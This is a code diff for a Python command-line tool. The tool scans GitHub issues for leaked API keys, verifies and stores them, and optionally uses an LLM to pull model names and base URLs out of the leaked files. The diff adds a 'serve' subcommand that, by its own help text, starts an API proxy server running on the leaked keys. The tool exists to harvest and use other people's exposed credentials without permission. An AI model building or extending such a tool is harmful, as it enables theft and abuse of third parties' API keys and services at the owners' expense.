@@ -851,23 +851,7 @@ def process_issue(
     return processed, skipped
 
 
-def main() -> None:
-    parser = argparse.ArgumentParser()
-    parser.add_argument(
-        "--ignore-saved", action="store_true", help="Re-verify and overwrite saved keys"
-    )
-    parser.add_argument(
-        "--llm-scan",
-        action="store_true",
-        help="Use LLM to extract model/base_url from leaked files",
-    )
-    parser.add_argument(
-        "--debug",
-        action="store_true",
-        help="Disable concurrency and sleep 5s after each issue",
-    )
-    args = parser.parse_args()
-
+def scan_main(args) -> None:
     load_dotenv()
 
     token = os.environ.get("GITHUB_API_KEY", "").strip()
@@ -885,21 +869,20 @@ def main() -> None:
         )
         llm_reasoning_mode = "off"
 
-    missing: list[str] = []
-    if not llm_base_url:
-        missing.append("LLM_BASE_URL")
-    if not llm_api_key:
-        missing.append("LLM_API_KEY")
-    if not llm_model_name:
-        missing.append("LLM_MODEL_NAME")
-    if not llm_reasoning_mode:
-        missing.append("LLM_REASONING_MODE")
-    if missing:
-        print(
-            f"error: --llm-scan requires {', '.join(missing)} in .env",
-            file=sys.stderr,
-        )
-        sys.exit(1)
+    if args.llm_scan:
+        missing: list[str] = []
+        if not llm_base_url:
+            missing.append("LLM_BASE_URL")
+        if not llm_api_key:
+            missing.append("LLM_API_KEY")
+        if not llm_model_name:
+            missing.append("LLM_MODEL_NAME")
+        if missing:
+            print(
+                f"error: --llm-scan requires {', '.join(missing)} in .env",
+                file=sys.stderr,
+            )
+            sys.exit(1)
 
     saved_keys = load_saved_keys()
     headers = {
@@ -980,6 +963,48 @@ def main() -> None:
     print(
         f"\nDone. Processed {total_processed} new key(s), skipped {total_skipped} already-saved key(s)."
     )
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser()
+    subparsers = parser.add_subparsers(dest="command")
+
+    scan_parser = subparsers.add_parser("scan", help="Scan GitHub for leaked API keys")
+    scan_parser.add_argument(
+        "--ignore-saved", action="store_true", help="Re-verify and overwrite saved keys"
+    )
+    scan_parser.add_argument(
+        "--llm-scan",
+        action="store_true",
+        help="Use LLM to extract model/base_url from leaked files",
+    )
+    scan_parser.add_argument(
+        "--debug",
+        action="store_true",
+        help="Disable concurrency and sleep 5s after each issue",
+    )
+
+    serve_parser = subparsers.add_parser(
+        "serve", help="Start API proxy server using leaked keys"
+    )
+    serve_parser.add_argument(
+        "--host", default="localhost", help="Host to bind to (default: localhost)"
+    )
+    serve_parser.add_argument(
+        "--port", type=int, default=6767, help="Port to bind to (default: 6767)"
+    )
+
+    args = parser.parse_args()
+
+    if args.command == "scan":
+        scan_main(args)
+    elif args.command == "serve":
+        from server import serve
+
+        serve(args.host, args.port)
+    else:
+        parser.print_help()
+        sys.exit(1)
 
 
 if __name__ == "__main__":
